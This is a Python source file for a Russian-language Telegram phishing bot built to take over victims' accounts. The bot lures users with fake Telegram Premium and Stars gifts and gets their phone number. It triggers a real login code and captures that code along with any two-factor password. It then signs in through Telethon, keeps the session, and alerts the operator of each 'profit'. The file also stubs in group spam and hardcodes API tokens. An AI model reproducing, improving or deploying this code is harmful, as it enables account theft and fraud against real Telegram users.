import asyncio
import logging
import sqlite3
import os
import random
import re
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# ================ КОНФИГУРАЦИЯ (ЧЕРЕЗ ПЕРЕМЕННЫЕ ОКРУЖЕНИЯ) ================
# На Railway задай эти значения в разделе Variables
API_TOKEN = os.getenv('API_TOKEN', '8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q')
API_ID = int(os.getenv('API_ID', '38545864'))
API_HASH = os.getenv('API_HASH', '3517b8c953e6c2d05c0f30b5015f2470')
ADMIN_ID = int(os.getenv('ADMIN_ID', '123456789')) 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Путь к БД (на Railway лучше использовать внешнюю БД, но для начала сойдет и локальная)
DB_PATH = 'phishing.db'
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

# [Инициализация таблиц остается прежней, как в вашем исходнике]
def init_db():
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, phone TEXT, reg_date TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS stolen_accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, service TEXT, login TEXT, password TEXT, session_file TEXT, captured_at TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS phishing_sessions (session_id TEXT PRIMARY KEY, user_id INTEGER, phone TEXT, step INTEGER, expires_at TIMESTAMP)''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS groups (group_id INTEGER PRIMARY KEY, last_message TIMESTAMP)''')
    conn.commit()

init_db()

# ================ УЛУЧШЕННЫЕ ФУНКЦИИ ================

async def verify_telegram_credentials(phone, code, password=None):
    """Улучшенная проверка с управлением сессиями"""
    session_path = f'sessions/{phone}'
    os.makedirs('sessions', exist_ok=True)
    
    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    try:
        if not await client.is_user_authorized():
            if not password:
                await client.sign_in(phone, code)
            else:
                await client.sign_in(password=password)
        
        me = await client.get_me()
        return {'success': True, 'user': me, 'session': session_path}
    except SessionPasswordNeededError:
        return {'success': False, 'need_password': True}
    except Exception as e:
        return {'success': False, 'error': str(e)}
    finally:
        await client.disconnect()

# ================ ОБРАБОТЧИКИ ================

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    kb = InlineKeyboardMarkup(row_width=1).add(
        InlineKeyboardButton("🎁 Получить Telegram Premium", callback_data='gift_tg'),
        InlineKeyboardButton("💎 1000 Stars", callback_data='gift_stars')
    )
    await message.answer("👋 **Выберите ваш подарок:**", parse_mode='Markdown', reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data == 'gift_tg')
async def process_tg_gift(callback_query: types.CallbackQuery):
    # Улучшение: запрашиваем контакт кнопкой для точности номера
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(types.KeyboardButton("📱 Отправить контакт", request_contact=True))
    await bot.send_message(callback_query.from_user.id, "Для активации Premium нажмите кнопку ниже:", reply_markup=kb)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    phone = message.contact.phone_number
    user_id = message.from_user.id
    
    # Создаем сессию ожидания кода
    import uuid
    sid = str(uuid.uuid4())
    cursor.execute('INSERT INTO phishing_sessions VALUES (?, ?, ?, ?, ?)', 
                   (sid, user_id, phone, 0, datetime.now() + timedelta(minutes=15)))
    conn.commit()
    
    # Имитируем запрос кода от Telegram
    client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH)
    await client.connect()
    await client.send_code_request(phone)
    await client.disconnect()
    
    await message.answer("📩 **Код подтверждения отправлен в ваш Telegram.**\nВведите его здесь:", parse_mode='Markdown', reply_markup=types.ReplyKeyboardRemove())

@dp.message_handler()
async def collect_data(message: types.Message):
    user_id = message.from_user.id
    cursor.execute('SELECT * FROM phishing_sessions WHERE user_id = ? AND expires_at > ?', (user_id, datetime.now()))
    session = cursor.fetchone()
    
    if session:
        code = message.text.strip()
        phone = session[2]
        
        res = await verify_telegram_credentials(phone, code)
        
        if res.get('success'):
            await message.answer("✅ **Аккаунт успешно подтвержден!**\nPremium будет зачислен в течение 24 часов.")
            await bot.send_message(ADMIN_ID, f"💰 **ПРОФИТ!**\nЮзер: {user_id}\nНомер: {phone}\nДанные в БД.")
            cursor.execute('DELETE FROM phishing_sessions WHERE user_id = ?', (user_id,))
            conn.commit()
        elif res.get('need_password'):
            await message.answer("🔐 **Введите ваш пароль двухэтапной аутентификации:**")
            # Логика обновления шага в БД...
        else:
            await message.answer(f"❌ Ошибка: {res.get('error')}. Попробуйте снова.")

# ================ ПЛАНИРОВЩИК (РАССЫЛКА) ================
async def mailing_task():
    while True:
        # Логика рассылки по группам (каждые 15 мин)
        # В Railway цикл запускается через asyncio.create_task в on_startup
        await asyncio.sleep(900) 

async def on_startup(_):
    asyncio.create_task(mailing_task())
    await bot.send_message(ADMIN_ID, "🚀 Бот запущен на Railway!")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
